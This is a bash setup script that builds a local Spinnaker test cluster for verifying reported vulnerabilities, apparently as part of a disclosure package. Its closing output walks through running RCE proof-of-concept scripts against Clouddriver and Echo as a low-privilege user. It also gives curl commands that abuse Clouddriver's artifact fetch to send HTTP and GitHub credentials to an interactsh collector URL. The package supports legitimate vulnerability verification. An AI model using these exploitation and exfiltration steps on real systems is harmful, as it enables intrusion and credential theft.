#!/usr/bin/env bash
# Setup script for Core Spinnaker verification cluster
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# --- Color helpers ---
green() { printf '\033[0;32m%s\033[0m\n' "$*"; }
red()   { printf '\033[0;31m%s\033[0m\n' "$*"; }
bold()  { printf '\033[1m%s\033[0m\n' "$*"; }

# --- Spinnaker source checkout ---
# The services are built from a Spinnaker source tree pinned to the commit these
# findings were reported against (release-2026.0.x @ 1e230e28e4). By default we
# clone it into setup/spinnaker_src; users can override SRC_DIR to point at an
# existing checkout instead. SRC_DIR is mounted into the build container and the
# service containers (docker-compose.yml reads it).
SPINNAKER_REPO_URL="https://github.com/spinnaker/spinnaker.git"
SPINNAKER_REF="spinnaker-release-2026.0.1"
SPINNAKER_COMMIT="1e230e28e4d82f144c5e08414fc1a21c9be73ef7"
DEFAULT_SRC_DIR="$SCRIPT_DIR/spinnaker_src"

if [ -z "${SRC_DIR:-}" ]; then
  SRC_DIR="$DEFAULT_SRC_DIR"
  echo "SRC_DIR not set — using default: $SRC_DIR"
fi

if [ ! -d "$SRC_DIR/.git" ]; then
  if [ -d "$SRC_DIR" ] && [ -n "$(ls -A "$SRC_DIR" 2>/dev/null)" ]; then
    red "ERROR: SRC_DIR='$SRC_DIR' exists, is non-empty, and is not a git checkout."
    echo "Remove it or point SRC_DIR at a valid Spinnaker source checkout."
    exit 1
  fi
  bold "=== Cloning Spinnaker source ==="
  echo "  Repo:   $SPINNAKER_REPO_URL"
  echo "  Branch: $SPINNAKER_REF"
  echo "  Commit: $SPINNAKER_COMMIT"
  echo "  Target: $SRC_DIR"
  git clone --branch "$SPINNAKER_REF" "$SPINNAKER_REPO_URL" "$SRC_DIR"
  git -C "$SRC_DIR" checkout "$SPINNAKER_COMMIT"
  green "Clone complete."
else
  current_commit="$(git -C "$SRC_DIR" rev-parse HEAD 2>/dev/null || echo '')"
  if [ "$current_commit" = "$SPINNAKER_COMMIT" ]; then
    green "=== Spinnaker source already checked out at $SRC_DIR (pinned commit) ==="
  else
    bold "=== Spinnaker source present at $SRC_DIR ==="
    echo "  Current HEAD: ${current_commit:-unknown}"
    echo "  Expected:     $SPINNAKER_COMMIT"
    echo "  Proceeding with current checkout (remove $SRC_DIR to force a reclone)."
  fi
fi

SRC_DIR="$(cd "$SRC_DIR" && pwd)"
export SRC_DIR

cd "$SCRIPT_DIR"

# --- Step 1: Build Spinnaker services from source ---
SERVICES=(front50 fiat clouddriver orca echo gate)

needs_build=false
for svc in "${SERVICES[@]}"; do
  if [ ! -d "$SRC_DIR/$svc/$svc-web/build/install/$svc" ]; then
    needs_build=true
    break
  fi
done

if [ "$needs_build" = true ]; then
  bold "=== Building Spinnaker services from source ==="
  echo "This uses a Docker container with JDK 17 to build all services."
  echo "Source directory: $SRC_DIR"
  echo ""

  # Build using a JDK 17 container with Gradle cache volume.
  # Clouddriver needs extra memory; we give 12g to the container and 8g to Gradle.
  # Services are built sequentially from the root workspace (composite build requires it).
  docker run --rm -m 12g \
    -v "$SRC_DIR":/workspace \
    -v spinnaker-gradle-cache:/root/.gradle \
    -w /workspace \
    eclipse-temurin:17-jdk-jammy \
    bash -c '
      set -euo pipefail
      echo "Installing git (needed by Gradle)..."
      apt-get update -qq && apt-get install -y -qq git >/dev/null 2>&1

      SERVICES=(front50 fiat clouddriver orca echo gate)
      for svc in "${SERVICES[@]}"; do
        if [ -d "/workspace/$svc/$svc-web/build/install/$svc" ]; then
          echo "  $svc: already built, skipping"
          continue
        fi
        echo "  Building $svc..."
        ./gradlew ":${svc}:${svc}-web:installDist" -x test --no-daemon --console=plain \
          -Dorg.gradle.jvmargs="-Xmx8g" 2>&1 | tail -5
        echo "  $svc: done"
      done
      echo "All services built."
    '
else
  green "=== All services already built, skipping build step ==="
fi

# Verify all builds exist
for svc in "${SERVICES[@]}"; do
  if [ ! -d "$SRC_DIR/$svc/$svc-web/build/install/$svc" ]; then
    red "ERROR: Build output missing for $svc at $SRC_DIR/$svc/$svc-web/build/install/$svc"
    exit 1
  fi
done
green "All service builds verified."

# --- Step 2: Build base Docker image ---
bold "=== Building spinnaker-base Docker image ==="
docker build -t spinnaker-base:local -f "$SCRIPT_DIR/Dockerfile.base" "$SCRIPT_DIR"

# --- Step 3: Start services via Docker Compose ---
bold "=== Starting services ==="
docker compose up -d

# --- Step 4: Wait for all services to be healthy ---
bold "=== Waiting for services to become healthy ==="

wait_for_health() {
  local service_name="$1"
  local url="$2"
  local max_attempts="${3:-60}"
  local attempt=0

  while [ $attempt -lt $max_attempts ]; do
    if curl -sf "$url" >/dev/null 2>&1; then
      green "  $service_name: healthy"
      return 0
    fi
    attempt=$((attempt + 1))
    if [ $((attempt % 10)) -eq 0 ]; then
      echo "  $service_name: waiting... (attempt $attempt/$max_attempts)"
    fi
    sleep 5
  done

  red "  $service_name: FAILED to become healthy after $max_attempts attempts"
  echo "  Logs for $service_name:"
  docker compose logs --tail=30 "$service_name" 2>/dev/null || true
  return 1
}

# Check infrastructure via docker compose health status
echo "Checking infrastructure containers..."
for infra in redis mysql elasticsearch; do
  status=$(docker compose ps --format '{{.Health}}' "$infra" 2>/dev/null || echo "unknown")
  if [ "$status" = "healthy" ]; then
    green "  $infra: healthy"
  else
    echo "  $infra: $status — waiting..."
    timeout 120 bash -c "
      while true; do
        s=\$(docker compose ps --format '{{.Health}}' $infra 2>/dev/null)
        [ \"\$s\" = 'healthy' ] && break
        sleep 3
      done
    " || { red "$infra failed to become healthy"; docker compose logs --tail=20 "$infra"; exit 1; }
    green "  $infra: healthy"
  fi
done

# Spinnaker services (order matters for dependency chain)
HEALTH_CHECKS=(
  "front50|http://localhost:8080/health|60"
  "fiat|http://localhost:7003/health|60"
  "clouddriver|http://localhost:7002/health|60"
  "orca|http://localhost:8083/health|60"
  "echo|http://localhost:8089/health|60"
  "gate|http://localhost:8084/health|60"
)

failed=false
for check in "${HEALTH_CHECKS[@]}"; do
  IFS='|' read -r name url attempts <<< "$check"
  if ! wait_for_health "$name" "$url" "$attempts"; then
    failed=true
  fi
done

if [ "$failed" = true ]; then
  red "=== Some services failed to start ==="
  docker compose ps
  exit 1
fi

green "All services healthy!"

# --- Step 5: Seed test data ---
bold "=== Seeding test data ==="
bash "$SCRIPT_DIR/seed.sh"

# --- Step 6: Verify environment ---
bold "=== Verifying environment ==="

verify_ok=true

# Gate has LDAP auth enabled, so verification requests need credentials.
# Authenticate as devuser first (populates Fiat's user cache), then use
# devuser for all Gate checks — devuser has target-team and can see both apps.
GATE_AUTH="devuser:devuser123"

echo "Populating Fiat user cache..."
curl -sf -u "$GATE_AUTH" "http://localhost:8084/applications" >/dev/null 2>&1 || true
sleep 2

# Check Gate is accessible
echo "Checking Gate API..."
if curl -sf -u "$GATE_AUTH" "http://localhost:8084/applications" >/dev/null 2>&1; then
  green "  Gate API: accessible"
else
  red "  Gate API: not accessible"
  verify_ok=false
fi

# Check applications exist
echo "Checking seeded applications..."
apps=$(curl -sf -u "$GATE_AUTH" "http://localhost:8084/applications" 2>/dev/null || echo "[]")
for app in testapp targetapp; do
  if echo "$apps" | grep -q "\"$app\""; then
    green "  Application '$app': found"
  else
    red "  Application '$app': NOT found"
    verify_ok=false
  fi
done

# Check pipelines exist
echo "Checking seeded pipelines..."
pipelines=$(curl -sf -u "$GATE_AUTH" "http://localhost:8084/applications/testapp/pipelineConfigs" 2>/dev/null || echo "[]")
for pl in "spel-test-pipeline" "basic-test-pipeline"; do
  if echo "$pipelines" | grep -q "\"$pl\""; then
    green "  Pipeline '$pl': found"
  else
    red "  Pipeline '$pl': NOT found"
    verify_ok=false
  fi
done

# Check pipeline templates
echo "Checking pipeline template..."
if curl -sf -u "$GATE_AUTH" "http://localhost:8084/v2/pipelineTemplates/test-template" >/dev/null 2>&1; then
  green "  Pipeline template 'test-template': found"
else
  # Try via Front50 directly (no auth required for templates)
  if curl -sf "http://localhost:8080/v2/pipelineTemplates/test-template" >/dev/null 2>&1; then
    green "  Pipeline template 'test-template': found (via Front50)"
  else
    red "  Pipeline template 'test-template': NOT found"
    verify_ok=false
  fi
fi

# Check Fiat roles
echo "Checking Fiat service account..."
if curl -sf "http://localhost:7003/authorize/test-svc-account@managed-service-account" >/dev/null 2>&1; then
  green "  Service account: found in Fiat"
else
  red "  Service account: NOT found in Fiat (may need sync)"
  # Not fatal — Fiat sync can be slow
fi

# Check key features for findings
echo "Checking Orca webhook stage..."
if curl -sf "http://localhost:8083/health" | grep -q "UP" 2>/dev/null; then
  green "  Orca: running (webhook stage enabled via config)"
else
  red "  Orca: health check issue"
  verify_ok=false
fi

echo "Checking Clouddriver artifacts..."
if curl -sf "http://localhost:7002/artifacts/credentials" >/dev/null 2>&1; then
  green "  Clouddriver artifacts: endpoint accessible"
else
  red "  Clouddriver artifacts: endpoint not accessible"
  verify_ok=false
fi

if [ "$verify_ok" = false ]; then
  red "=== Some verifications failed — environment may not be fully ready ==="
  exit 1
fi

# --- Summary ---
echo ""
bold "=========================================="
bold "  Core Spinnaker Cluster Ready"
bold "=========================================="
echo ""
echo ""
echo "Services running:"
echo "  Gate (API Gateway):    http://localhost:8084"
echo "  Orca (Orchestration):  http://localhost:8083"
echo "  Clouddriver:           http://localhost:7002"
echo "  Front50 (Metadata):    http://localhost:8080"
echo "  Fiat (Auth):           http://localhost:7003"
echo "  Echo (Notifications):  http://localhost:8089"
echo "  Redis:                 redis:6379 (Docker internal)"
echo "  MySQL:                 mysql:3306 (Docker internal)"
echo "  Elasticsearch:         elasticsearch:9200 (Docker internal)"
echo ""
echo "LDAP users (authenticate via Gate with HTTP Basic):"
echo "  lowpriv  / lowpriv123   — no roles, unrestricted apps only"
echo "  viewer   / viewer123    — viewers group (read-only)"
echo "  devuser  / devuser123   — target-team (READ/WRITE/EXECUTE on targetapp)"
echo ""
echo "Applications:"
echo "  testapp    — unrestricted (all users)"
echo "  targetapp  — restricted to target-team (devuser only)"
echo ""
echo "Seed data:"
echo "  Pipelines: spel-test-pipeline, basic-test-pipeline (in testapp)"
echo "  Template: test-template"
echo "  Service account: test-svc-account@managed-service-account (target-team)"
echo ""
echo "Re-run:   cd $SCRIPT_DIR && ./setup.sh"
echo "Teardown: cd $SCRIPT_DIR && ./teardown.sh"
echo ""
echo "To try POCs:"
echo "   - Make sure you have Python 3.10+ and uv installed (https://uv.pypa.io/en/latest/installation.html)"
echo "   - cd $SCRIPT_DIR/.."
echo ""
echo "   Clouddriver RCE via authenticated user with no privilege:"
echo ""
echo "      uv run --no-project --with requests pocs/clouddriver_rce_via_git_clone.py --gate-url http://localhost:8084 \\"
echo "      --gate-user lowpriv --gate-password lowpriv123"
echo ""
echo "      Once you have a shell, exfiltrate the fake AWS credentials from the config:"
echo "      $ cat /opt/spinnaker/config/clouddriver.yml | grep -A2 'Key'"
echo "      accessKeyId: AKIAIOSFODNN7EXAMPLE"
echo "      secretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
echo ""
echo "   Echo RCE via authenticated user with no privilege and an app that allows any user to edit:"
echo ""
echo "      uv run --no-project --with requests pocs/echo_rce_via_spel.py --app testapp --gate-url http://localhost:8084 \\"
echo "      --gate-user lowpriv --gate-password lowpriv123"
echo ""
echo "   Echo RCE via authenticated user with app WRITE permissions to a restricted app:"
echo ""
echo "      uv run --no-project --with requests pocs/echo_rce_via_spel.py --app targetapp --gate-url http://localhost:8084 \\"
echo "      --gate-user devuser --gate-password devuser123"
echo ""
echo "   From the Echo shell, pivot to Clouddriver to exfiltrate artifact credentials:"
echo ""
echo "      # Go to https://app.interactsh.com/ and copy your unique interactsh URL"
echo "      # (looks like: https://abcdef123.oast.fun)"
echo "      # Incoming requests and their headers will appear in the browser."
echo ""
echo "      # List artifact accounts (no auth required on Clouddriver's internal port):"
echo "      curl -s http://clouddriver:7002/artifacts/credentials"
echo ""
echo "      # Exfiltrate HTTP account credentials (Basic Auth in Authorization header):"
echo "      curl -s -X PUT http://clouddriver:7002/artifacts/fetch \\"
echo "        -H 'Content-Type: application/json' \\"
echo "        -d '{\"type\":\"http/file\",\"name\":\"x\",\"reference\":\"https://<your-interactsh-url>/collect\",\"artifactAccount\":\"test-http-account\"}'"
echo ""
echo "      # Exfiltrate GitHub token (Bearer token in Authorization header):"
echo "      curl -s -X PUT http://clouddriver:7002/artifacts/fetch \\"
echo "        -H 'Content-Type: application/json' \\"
echo "        -d '{\"type\":\"github/file\",\"name\":\"x\",\"reference\":\"https://<your-interactsh-url>/collect\",\"artifactAccount\":\"test-github-account\"}'"
echo ""
green "=== Setup complete ==="
